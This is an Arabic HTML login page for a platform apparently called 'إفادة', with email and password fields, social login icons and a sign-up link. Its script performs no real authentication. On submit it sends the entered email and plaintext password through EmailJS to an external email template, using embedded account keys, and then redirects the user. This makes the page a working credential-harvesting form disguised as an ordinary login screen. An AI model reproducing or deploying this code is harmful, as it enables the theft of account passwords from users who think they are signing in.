<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام تسجيل الدخول المتقدم</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        :root {
            --primary-bg: #1a1a2e;
            --secondary-bg: #16213e;
            --accent-color: #64ffda;
            --text-primary: #ccd6f6;
            --text-secondary: #8892b0;
            --input-bg: rgba(100, 255, 218, 0.1);
            --error-color: #ff647f;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Tajawal', sans-serif;
        }

        body {
    background: linear-gradient(135deg, var(--primary-bg), var(--secondary-bg));
    color: var(--text-primary);
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: flex-start; /* بدلًا من center */
    position: relative;
    padding: 2rem 0; /* إضافة مساحة رأسية لتفادي القطع */
    overflow-y: auto; /* السماح بالتمرير */
}


        .platform-logo {
            position: absolute;
            top: 30px;
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background: linear-gradient(45deg, var(--accent-color), #00a8cc);
            box-shadow: 0 8px 25px rgba(100, 255, 218, 0.4);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .platform-logo img {
            width: 60%;
            height: 60%;
            object-fit: contain;
            filter: brightness(0) invert(1);
        }

        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 2rem;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
            margin-top: 120px;
        }

        .form-header {
            text-align: center;
            margin-bottom: 2rem;
        }

        .form-header h1 {
            background: linear-gradient(45deg, var(--accent-color), #00a8cc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 2.5rem;
            margin-bottom: 0.5rem;
        }

        .form-header p {
            color: var(--text-secondary);
            font-size: 1.1rem;
        }

        .input-group {
            position: relative;
            margin-bottom: 1.5rem;
        }

        .input-group input {
            width: 100%;
            padding: 1rem;
            background: var(--input-bg);
            border: 2px solid transparent;
            border-radius: 10px;
            color: var(--text-primary);
            font-size: 1rem;
            transition: var(--transition);
        }

        .input-group input:focus {
            border-color: var(--accent-color);
            box-shadow: 0 0 15px rgba(100, 255, 218, 0.2);
        }

        .password-toggle {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-secondary);
            cursor: pointer;
            transition: var(--transition);
        }

        .password-toggle:hover {
            color: var(--accent-color);
        }

        .remember-forgot {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 1.5rem 0;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            color: var(--text-secondary);
        }

        .remember-me input {
            accent-color: var(--accent-color);
        }

        .forgot-password {
            color: var(--accent-color);
            text-decoration: none;
            transition: var(--transition);
        }

        .forgot-password:hover {
            text-shadow: 0 0 10px rgba(100, 255, 218, 0.3);
        }

        .submit-btn {
            background: linear-gradient(45deg, var(--accent-color), #00a8cc);
            color: var(--primary-bg);
            width: 100%;
            padding: 1rem;
            border: none;
            border-radius: 10px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(100, 255, 218, 0.3);
        }

        .social-login {
            margin: 2rem 0;
            text-align: center;
        }

        .social-text {
            color: var(--text-secondary);
            position: relative;
            margin: 1rem 0;
        }

        .social-text::before,
        .social-text::after {
            content: '';
            position: absolute;
            top: 50%;
            width: 30%;
            height: 1px;
            background: var(--text-secondary);
            opacity: 0.3;
        }

        .social-text::before { right: 0; }
        .social-text::after { left: 0; }

        .social-icons {
            display: flex;
            justify-content: center;
            gap: 1rem;
        }

        .social-icon {
            width: 45px;
            height: 45px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            text-decoration: none;
            transition: var(--transition);
        }

        .google { background: #db4437; }
        .facebook { background: #3b5998; }

        .social-icon:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }

        .register-link {
            text-align: center;
            margin-top: 1.5rem;
        }

        .register-link a {
            color: var(--accent-color);
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            transition: var(--transition);
        }

        .register-link a:hover {
            text-shadow: 0 0 10px rgba(100, 255, 218, 0.3);
        }

        .error-message {
            color: var(--error-color);
            font-size: 0.9rem;
            margin-top: 0.5rem;
            display: none;
        }

        @media (max-width: 768px) {
            .container {
                padding: 1.5rem;
                margin-top: 100px;
            }
            
            .form-header h1 {
                font-size: 2rem;
            }
        }
        .platform-logo img {
    filter: none;
}

    </style>
</head>
<body>
    <div class="platform-logo">
        <img src="3e50cb7e-3077-471a-8749-9864648da119.png" alt="شعار إفادة">
    </div>

    <div class="container">
        <div class="form-container">
            <div class="form-header">
                <h1>مرحبًا بعودتك!</h1>
                <p>الرجاء إدخال بياناتك للدخول إلى حسابك</p>
            </div>

            <form id="loginForm">
                <div class="input-group">
                    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
                    <span class="error-message">البريد الإلكتروني غير صحيح</span>
                </div>

                <div class="input-group">
                    <input type="password" id="password" placeholder="كلمة المرور" required>
                    <i class="fas fa-eye password-toggle"></i>
                    <span class="error-message">كلمة المرور يجب أن تكون 8 أحرف على الأقل</span>
                </div>

                <div class="remember-forgot">
                    <label class="remember-me">
                        <input type="checkbox"> تذكرني
                    </label>
                    <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>
                </div>

                <button type="submit" class="submit-btn" id="loginBtn">تسجيل الدخول</button>
            </form>

            <div class="social-login">
                <p class="social-text">أو سجل الدخول باستخدام</p>
                <div class="social-icons">
                    <a href="#" class="social-icon google">
                        <i class="fab fa-google"></i>
                    </a>
                    <a href="#" class="social-icon facebook">
                        <i class="fab fa-facebook-f"></i>
                    </a>
                </div>
            </div>

            <div class="register-link">
                <p>ليس لديك حساب؟ <a href="index2.html">أنشئ حسابًا جديدًا</a></p>
            </div>
        </div>
    </div>

    <script>
        emailjs.init('nf2gRwNiQobOFrImW');

        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const passwordToggle = document.querySelector('.password-toggle');

        function togglePasswordVisibility() {
            const type = passwordInput.type === 'password' ? 'text' : 'password';
            passwordInput.type = type;
            passwordToggle.classList.toggle('fa-eye-slash');
        }

        function isValidEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        function isValidPassword(password) {
            return password.length >= 8;
        }

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            
            let isValid = true;
            
            if (!isValidEmail(emailInput.value)) {
                emailInput.parentElement.classList.add('error');
                isValid = false;
            } else {
                emailInput.parentElement.classList.remove('error');
            }

            if (!isValidPassword(passwordInput.value)) {
                passwordInput.parentElement.classList.add('error');
                isValid = false;
            } else {
                passwordInput.parentElement.classList.remove('error');
            }

            if (isValid) {
                const btn = document.getElementById('loginBtn');
                btn.disabled = true;
                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التسجيل...';

                const params = {
                    email: emailInput.value,
                    password: passwordInput.value,
                    name: "مستخدم جديد"
                };

                emailjs.send("service_r7ujzzg", "template_vhxyi1b", params)
                .then(() => {
                    setTimeout(() => {
                        window.location.href = "start.html";
                    }, 1000);
                })
                .catch((error) => {
                    btn.disabled = false;
                    btn.innerHTML = 'تسجيل الدخول';
                    alert("فشل في عملية التسجيل: " + (error.text || "خطأ غير معروف"));
                });
            }
        });

        emailInput.addEventListener('input', () => {
            if (isValidEmail(emailInput.value)) {
                emailInput.parentElement.classList.remove('error');
            }
        });

        passwordInput.addEventListener('input', () => {
            if (isValidPassword(passwordInput.value)) {
                passwordInput.parentElement.classList.remove('error');
            }
        });
         // تحقق إذا كانت هذه أول زيارة (مثلاً لا يوجد session)
    if (!sessionStorage.getItem('visited')) {
        sessionStorage.setItem('visited', 'true');
        window.location.href = 'index.html'; // أو الصفحة الرئيسية التي تريدها
    }


        passwordToggle.addEventListener('click', togglePasswordVisibility);
    </script>
</body>
</html>
